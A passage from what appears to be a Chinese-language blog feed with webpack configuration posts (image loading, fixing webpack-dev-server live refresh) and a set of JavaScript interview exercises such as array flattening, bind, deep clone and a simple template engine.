webpack.config.js 添加配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">    loaders: [</span><br><span class="line">        &#123;</span><br><span class="line">            test: <span class="regexp">/\.html$/</span>,</span><br><span class="line">            loader: <span class="string">'html-withimg-loader'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 bundle.js 中引用 html 文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'../index.html'</span>;</span><br></pre></td></tr></table></figure></p><p>这样 html 文件中的图片就可以被打包进 bundle 文件夹里了。</p><p><strong>感谢您的浏览，希望能有所帮助</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;本文非本人原创，转自&lt;a href=&quot;http://www.cnblogs.com/ghost-xyx/p/5812902.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;webpack踩坑之路 (2)——图片的路径与打包
      
    
    </summary>
    
      <category term="webpack" scheme="http://yoursite.com/categories/webpack/"/>
    
    
      <category term="webpack" scheme="http://yoursite.com/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>webpack踩坑（一）——webpack-dev-server不更新</title>
    <link href="http://yoursite.com/2017/10/02/webpack%E8%B8%A9%E5%9D%91--webpack-dev-server%E4%B8%8D%E5%88%B7%E6%96%B0/"/>
    <id>http://yoursite.com/2017/10/02/webpack踩坑--webpack-dev-server不刷新/</id>
    <published>2017-10-02T14:48:10.000Z</published>
    <updated>2017-10-02T14:48:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次接触webpack是使用vue-cli的时候，方便极了，一行命令chua！chua！chua！<br>好嘞，上手吧。</p><p>而对我这种新人来讲，需要手动搭建webpack开发环境的时候就是一脸懵逼了。</p><p>当你觉得一个工具很自然的时候，说明你还没有要到使用这个工具的地步。</p><p>只有经过了各种折磨之后，有人突然给你看一个大宝贝儿：“喏，这个很方便的”。你惊为天人的时候，这个工具才适合你。否则只是一个搬砖工，知其然不知其所以然。当然，搬砖搬得6那也是项绝活儿。</p><p>基本概念就不提了，什么entry入口文件、output输出路径、loader干啥的、plugin又是啥，看英文单词的中文意思即可。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>今天在自己搭建react开发环境的时候，才知晓以前vue开发时自动更新是如何做到的，当然踩了不少坑，以下代码均是在webpack 3.3.0环境下操作。</p><h3 id="webpack-dev-server"><a href="#webpack-dev-server" class="headerlink" title="webpack-dev-server"></a>webpack-dev-server</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>webpack-dev-server就是起一个小型服务器，底层是express。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack-dev-server --save-dev</span><br></pre></td></tr></table></figure></p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ul><li>使用babel-loader以及各种相关的preset解析我们的react语法jsx以及es语法;</li><li>使用css-loader以及style-loader让我们能够在jsx中引入css文件;</li><li>使用file-loader以及url-loader对图片进行处理（还有坑爹的路径问题，下一篇文章写）。<br>代码如下：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">        app: path.join(__dirname, <span class="string">'src'</span>, <span class="string">'index.js'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        loaders: [</span><br><span class="line">            &#123; <span class="comment">// js的loader，可以理解为gulp里面对js文件进行操作的插件，此处是依赖babel-loader将我们所编写的es6以及jsx转变为浏览器可以识别的代码</span></span><br><span class="line">                test: <span class="regexp">/\.js?$/</span>,</span><br><span class="line">                exclude: <span class="regexp">/(node_modules)/</span>,</span><br><span class="line">                loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">                query: &#123;</span><br><span class="line">                    presets: [<span class="string">'react'</span>, <span class="string">'es2015'</span>, <span class="string">'stage-0'</span>],</span><br><span class="line">                    plugins: [<span class="string">'react-html-attrs'</span>],<span class="comment">// 组件的插件配置，jsx可以不用写className，写class，其实意义不大</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.css?$/</span>,</span><br><span class="line">                loader: <span class="string">'style-loader!css-loader'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.(png|jpg)$/</span>,</span><br><span class="line">                loader: <span class="string">'url-loader?limit=8192&amp;name=images/[hash:8].[name].[ext]'</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [ <span class="comment">// 热更新需要的插件</span></span><br><span class="line">        <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line">    ],</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">"dist"</span>),<span class="comment">// webpack后的bundle.js所在目录</span></span><br><span class="line">        filename: <span class="string">"bundle.js"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    devServer: &#123; <span class="comment">// 开发服务器配置</span></span><br><span class="line">        contentBase: <span class="string">"./dist"</span>, <span class="comment">// 起服务器的目录,指定了服务器资源的根目录,服务器打包的bundle.js在内存中，通过改路径引用，而非output路径</span></span><br><span class="line">        historyApiFallback: <span class="literal">true</span>,</span><br><span class="line">        port: <span class="number">8000</span>,</span><br><span class="line">        hot: <span class="literal">true</span>,</span><br><span class="line">        inline: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>划重点，要使用webpack-dev-server需要配置以下内容</p><ul><li><p>一个插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins: [ // 热更新需要的插件</span><br><span class="line">       new webpack.HotModuleReplacementPlugin(),</span><br><span class="line">   ],</span><br></pre></td></tr></table></figure></li><li><p>服务器配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123; // 开发服务器配置</span><br><span class="line">       contentBase: <span class="string">"./"</span>, // 起服务器的目录,指定了服务器资源的根目录,经过服务器打包的bundle.js在内存中，通过该路径引用，而非webpack打包的output路径</span><br><span class="line">       historyApiFallback: <span class="literal">true</span>,</span><br><span class="line">       port: 8000,  // 监听8000端口</span><br><span class="line">       hot: <span class="literal">true</span>, // 是否热更新</span><br><span class="line">       inline: <span class="literal">true</span> // inline模式</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ul><p>后面几个参数看文档很好理解,重点理解第一个参数：contentBase，该参数规定了你的服务器根目录，比如apache的www文件夹，通过命令行参数将服务器运行起来，会自动打包生成一个bundle.js，但是这个bundle.js并不是我们原来使用webpack命令生成的那个bundle.js，可能这样说有点混乱。<br>以下是我的理解：</p><ul><li>命令行使用webpack命令，会根据webpack.config.js配置文件直接进行打包，并输出至output路径；</li><li>通过命令行启动webpack-dev-server服务，也会根据webpack.config.js配置文件直接进行打包，但不会在output路径下生成一个bundle.js，而是在内存中生成，每次文件发生变化也会自动生成,而是在服务器根目录contentBase下存在一个bundle.js，我们看不见。</li></ul><p>比如文件结构如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">----index.html</span><br><span class="line">----dist</span><br><span class="line">--------bundle.js</span><br></pre></td></tr></table></figure></p><p>我们会在index.html中如此引用bundle.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"./dist/bundle.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>没毛病。<br>但是如果你起了一个webpack-dev-server，服务器根目录为’./‘即项目根目录，那么这样你的网页并不会实时刷新，因为引用的一直是webpack打包生成的那个bundle.js，而非webpack-dev-server生成的bundle.js，我们应当改为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"./bundle.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>这样便可以引用到最新的bundle.js，实现实时刷新。</p><p>其实可以将index.html也放进dist目录，再将contentBase更改为’./dist’</p><p>如此一来webpack生成的bundle.js与webpack-dev-server生成的bundle.js便可以通过相同路径引用了，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"./bundle.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>webpack-dev-server的原理我猜应该是通过检测文件变化，随后使用websocket之类的能够由服务器向客户端发送信息的方式进行实时刷新。</p><p>对了，在package.json中配置如下命令可以通过npm start快速执行webpack-dev-server，少打几个字母。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"scripts"</span>: &#123;</span><br><span class="line">    <span class="string">"start"</span>: <span class="string">"webpack-dev-server --inline"</span></span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;第一次接触webpack是使用vue-cli的时候，方便极了，一行命令chua！chua！chua！&lt;br&gt;好嘞，上手吧。&lt;/p&gt;
&lt;p&gt;而
      
    
    </summary>
    
      <category term="webpack" scheme="http://yoursite.com/categories/webpack/"/>
    
    
      <category term="webpack" scheme="http://yoursite.com/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>最近遇到的一些js编程题</title>
    <link href="http://yoursite.com/2017/09/27/%E6%9C%80%E8%BF%91%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9Bjs%E7%BC%96%E7%A8%8B%E9%A2%98/"/>
    <id>http://yoursite.com/2017/09/27/最近遇到的一些js编程题/</id>
    <published>2017-09-27T14:47:28.000Z</published>
    <updated>2017-09-27T14:47:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数组扁平化"><a href="#数组扁平化" class="headerlink" title="数组扁平化"></a>数组扁平化</h2><p>例：<br>输入：[[1, 2, 2], [3, 4, 5, 5], [6, 7, 8, 9, [11, 12, [12, 13, [14]]]], 10]<br>输出：[ 1, 2, 2, 3, 4, 5, 5, 6, 7, 8, 9, 11, 12, 12, 13, 14, 10 ]</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newArr = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Object</span>.prototype.toString.call(arr[i]) === <span class="string">'[object Array]'</span>) &#123;</span><br><span class="line">            flatten(arr[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            newArr.push(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flatten = <span class="function"><span class="keyword">function</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">previous, val</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Object</span>.prototype.toString.call(val) !== <span class="string">'[object Array]'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (previous.push(val), previous);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">Array</span>.prototype.push.apply(previous, flatten(val)), previous);</span><br><span class="line">    &#125;, []);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr.some(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">Array</span>.isArray(item))) &#123;</span><br><span class="line">        arr = [].concat(...arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现map"><a href="#实现map" class="headerlink" title="实现map"></a>实现map</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myMap = <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> item = callback(<span class="keyword">this</span>[i], i);</span><br><span class="line">        arr.push(item);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现bind"><a href="#实现bind" class="headerlink" title="实现bind"></a>实现bind</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> args = [].slice.call(<span class="built_in">arguments</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> self.apply(context, args.concat(<span class="built_in">arguments</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现一个简单的字符串模版引擎"><a href="#实现一个简单的字符串模版引擎" class="headerlink" title="实现一个简单的字符串模版引擎"></a>实现一个简单的字符串模版引擎</h2><p>效果如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'hello, i am &lt;%=user%&gt;, from &lt;%=location%&gt;'</span>;</span><br><span class="line"><span class="keyword">var</span> compiled = template(str);</span><br><span class="line">compiled(&#123;<span class="attr">user</span>: <span class="string">'zzw'</span>, <span class="attr">location</span>: <span class="string">'ez'</span>&#125;); <span class="comment">// 'hello, i am zzw, from ez'</span></span><br></pre></td></tr></table></figure></p><p>代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span>(<span class="params">temp</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp = temp;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> reg = <span class="regexp">/&lt;%=(\w+)%&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> result;</span><br><span class="line">        <span class="built_in">console</span>.log(temp);</span><br><span class="line">        <span class="keyword">while</span> (result = reg.exec(temp)) &#123;</span><br><span class="line">            <span class="keyword">var</span> key = result[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> value = obj[key];</span><br><span class="line">            temp = temp.replace(result[<span class="number">0</span>], value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="实现深克隆"><a href="#实现深克隆" class="headerlink" title="实现深克隆"></a>实现深克隆</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result,oClass=isClass(obj);</span><br><span class="line">        <span class="comment">//确定result的类型</span></span><br><span class="line">    <span class="keyword">if</span>(oClass===<span class="string">"Object"</span>)&#123;</span><br><span class="line">        result=&#123;&#125;;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(oClass===<span class="string">"Array"</span>)&#123;</span><br><span class="line">        result=[];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(key <span class="keyword">in</span> obj)&#123;</span><br><span class="line">        <span class="keyword">var</span> copy=obj[key];</span><br><span class="line">        <span class="keyword">if</span>(isClass(copy)==<span class="string">"Object"</span> || isClass(copy)==<span class="string">"Array"</span>)&#123;</span><br><span class="line">            result[key]=<span class="built_in">arguments</span>.callee(copy);<span class="comment">//递归调用</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="comment">//如果为基本数据类型</span></span><br><span class="line">            result[key]=obj[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回传递给他的任意对象的类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isClass</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(o===<span class="literal">null</span>) <span class="keyword">return</span> <span class="string">"Null"</span>;</span><br><span class="line">    <span class="keyword">if</span>(o===<span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"Undefined"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(o).slice(<span class="number">8</span>,<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="深克隆变形题目：将json字符串所有键名第一个首字母转为大写-考虑嵌套对象"><a href="#深克隆变形题目：将json字符串所有键名第一个首字母转为大写-考虑嵌套对象" class="headerlink" title="深克隆变形题目：将json字符串所有键名第一个首字母转为大写(考虑嵌套对象)"></a>深克隆变形题目：将json字符串所有键名第一个首字母转为大写(考虑嵌套对象)</h2><p>例：输入<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"hyKey"</span>:<span class="string">"myValue"</span>,<span class="string">"q23"</span>:<span class="string">"123"</span>,<span class="string">"arr"</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],<span class="string">"obj"</span>:&#123;<span class="string">"name"</span>:<span class="string">"zzw"</span>&#125;,<span class="string">"null"</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure></p><p>输出:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"HyKey"</span>:<span class="string">"myValue"</span>,<span class="string">"Q23"</span>:<span class="string">"123"</span>,<span class="string">"Arr"</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],<span class="string">"Obj"</span>:&#123;<span class="string">"Name"</span>:<span class="string">"zzw"</span>&#125;,<span class="string">"Null"</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toUpperCase1</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result,oClass=isClass(obj);</span><br><span class="line">    <span class="keyword">if</span>(oClass===<span class="string">"Object"</span>)&#123;</span><br><span class="line">        result=&#123;&#125;;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(oClass===<span class="string">"Array"</span>)&#123;</span><br><span class="line">        result=[];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> obj)&#123;</span><br><span class="line">        <span class="keyword">var</span> copy=obj[key];</span><br><span class="line">        <span class="keyword">if</span>(isClass(copy)==<span class="string">"Object"</span> || isClass(copy)==<span class="string">"Array"</span>)&#123;</span><br><span class="line">            result[key.slice(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() +key.slice(<span class="number">1</span>)]=<span class="built_in">arguments</span>.callee(copy);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            result[key.slice(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() +key.slice(<span class="number">1</span>)]=obj[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h2><p>实现：给定一个ul列表，里面有若干个li标签，li里面也嵌套了若干标签，要求点击标签，弹出当前li在ul中的位置.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"ul"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>li-a-span<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>li-a-span<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>li-a-span<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>li-a-span<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>li-a-span<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 